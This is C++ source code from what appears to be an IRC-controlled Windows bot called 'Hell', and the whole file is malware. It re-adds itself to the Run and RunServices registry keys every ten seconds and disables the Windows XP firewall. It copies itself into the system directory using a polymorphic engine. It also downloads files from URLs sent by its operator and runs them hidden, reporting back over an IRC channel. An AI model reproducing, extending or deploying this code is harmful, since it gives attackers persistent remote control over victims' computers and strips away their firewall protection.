// CDownload class
// CInstall class
// CRegCheck class

#include "Hell.h"
#include "Crc32Static.h"

CCrc32Static CRCCheck;

void *CRegCheck::Run()
{
	DWORD disable_val=4,SizeOf_disable_val=sizeof(DWORD);
	while(1) {
		HKEY key;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, Hell->cIRC.cConf.cRegName.c_str(), 0, REG_SZ, (LPBYTE)Hell->cIRC.cConf.cFileName.c_str(), (DWORD)Hell->cIRC.cConf.cFileName.length()); 
		RegCloseKey(key); 

		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegSetValueEx(key, Hell->cIRC.cConf.cRegName.c_str(), 0, REG_SZ, (LPBYTE)Hell->cIRC.cConf.cFileName.c_str(), (DWORD)Hell->cIRC.cConf.cFileName.length()); 
		RegCloseKey(key);

		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,	//disable winXP firewall
		"SYSTEM\\CurrentControlSet\\Services\\SharedAccess",0,KEY_WRITE,&key)==ERROR_SUCCESS)
		{
		RegSetValueEx(key,"Start",0,REG_DWORD,(BYTE *)&disable_val,SizeOf_disable_val);
		RegCloseKey(key);
		}
	
		Sleep(10000);
	}
	return NULL;
}

void CRegCheck::Uninstall()
{
	HKEY key;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, Hell->cIRC.cConf.cRegName.c_str()); 
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	RegDeleteValue(key, Hell->cIRC.cConf.cRegName.c_str()); 
	RegCloseKey(key); 
}


void *CInstall::Run()
{
	string ssDir;
	string newDir;
	char sysDir[255], sDir[255];
	GetSystemDirectory(sysDir,255);
	GetModuleFileName(GetModuleHandle(NULL),sDir,255);
	ssDir = sDir;
	if (ssDir.substr(0,ssDir.find_last_of("\\")).compare(sysDir) != 0) {
		cout << "[x] copying to system directory" << endl;
		newDir = sysDir + Hell->cIRC.cConf.cFileName.insert(0,"\\",0,string::npos);
		for (int i=0; i<3; i++) {
			if(!Hell->hPolymorph.DoPolymorph(sDir, newDir.c_str()));
			{
			    //if (CopyFile(sDir,newDir.c_str(),false)) {
				cout << "[x] finished copying to system dir -> " << newDir << endl;
				//	break; }
			    //else {
				  //  cout << "[x] cannot copy to system dir -> " << newDir << endl; }
			}
		}	
		
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		ZeroMemory( &sinfo, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(STARTUPINFO);
		char szDest[256];
		stringstream ss;
		ss << newDir.c_str();
		ss >> szDest;		
		if (CreateProcess(NULL, szDest , NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			Hell->botRunning = false;
			ExitProcess(0);
		} else {
			cout << "[x] cannot start copied file" << endl; 			
		}
	}
	return NULL;
}

void *CDownload::Run()
{
	HINTERNET hInternet=NULL;
	char sBuffer[1028];
	DWORD rVal, dVal, sTotal;
	hInternet=InternetOpen("POExplorer",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	HANDLE OpenURL = InternetOpenUrl(hInternet,sUrl.c_str(),NULL,0,INTERNET_FLAG_NO_CACHE_WRITE,0);
	if (OpenURL != NULL) {
		HANDLE CreateDestFile = CreateFile(sDest.c_str(),GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		if (CreateDestFile < (HANDLE)1) {
			cout << "Cannot create file" << endl;
			return false;
			ExitThread(0);
		}
		Hell->cIRC.SendData("PRIVMSG %s :http(file) downloading...\r\n",Hell->cIRC.cConf.cChan.c_str());
		char* fileBuffer = (char*)malloc(512000);
		sTotal = 0;
		do {
			memset(sBuffer,0,sizeof(sBuffer));
			InternetReadFile(OpenURL, sBuffer, sizeof(sBuffer), &rVal);
			WriteFile(CreateDestFile, sBuffer, rVal, &dVal, NULL);

			if (sTotal < 512000) {
				unsigned int bytestocopy;
				bytestocopy=512000-sTotal;
				if (bytestocopy>rVal) 
					bytestocopy=rVal;
				memcpy(&fileBuffer[sTotal],sBuffer,bytestocopy);
			}
			sTotal += rVal;
		} while (rVal > 0);

		Hell->cIRC.SendData("PRIVMSG %s :http(file) downloaded -> (size: %dKB).\r\n",Hell->cIRC.cConf.cChan.c_str(),sTotal / 1024);
		CloseHandle(CreateDestFile);
		free(fileBuffer);
		
		if (sUpdate.compare(0,sUpdate.length(),"-u") == 0) {
			Hell->cIRC.SendData("PRIVMSG %s :updating...\r\n",Hell->cIRC.cConf.cChan.c_str());
			Hell->hRegcheck.Kill();	
			Hell->hRegcheck.Uninstall();
			char sDir[255];
			DWORD CRCthis;
			DWORD CRCupdate;
			GetModuleFileName(GetModuleHandle(NULL),sDir,255);
			CRCCheck.FileCrc32Win32(sDir,CRCthis);
			CRCCheck.FileCrc32Win32(sDest.c_str(),CRCupdate);
		//	Hell->cIRC.SendData("PRIVMSG %s :crc(current): %d\r\n",Hell->cIRC.cConf.vChan.c_str(),CRCthis);
		//	Hell->cIRC.SendData("PRIVMSG %s :crc(update): %d\r\n",Hell->cIRC.cConf.vChan.c_str(),CRCupdate);
			if (CRCthis != CRCupdate) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&pinfo, 0, sizeof(pinfo));
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.lpTitle = "";
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow = SW_HIDE;
				char szDest[256];
				stringstream ss;
				ss << sDest.c_str();
				ss >> szDest;
				if (CreateProcess(NULL, szDest , NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) == TRUE) {
					WSACleanup();
					ExitProcess(0);
				} else 
					Hell->cIRC.SendData("PRIVMSG %s :file cannot be executed.\r\n",Hell->cIRC.cConf.cChan.c_str());
			} else 
				Hell->cIRC.SendData("PRIVMSG %s :current file is already updated.\r\n",Hell->cIRC.cConf.cChan.c_str());
		
		} else if (sUpdate.compare(0,sUpdate.length(),"-e") == 0) {
			ShellExecute(NULL,"open",sDest.c_str(),NULL,NULL,SW_HIDE);
			Hell->cIRC.SendData("PRIVMSG %s :opened file.\r\n",Hell->cIRC.cConf.cChan.c_str());
		}
		InternetCloseHandle(OpenURL);		
	} else {
		Hell->cIRC.SendData("PRIVMSG %s :http(file) cannot be downloaded.\r\n",Hell->cIRC.cConf.cChan.c_str());
		InternetCloseHandle(OpenURL);
	}
	return NULL;
}

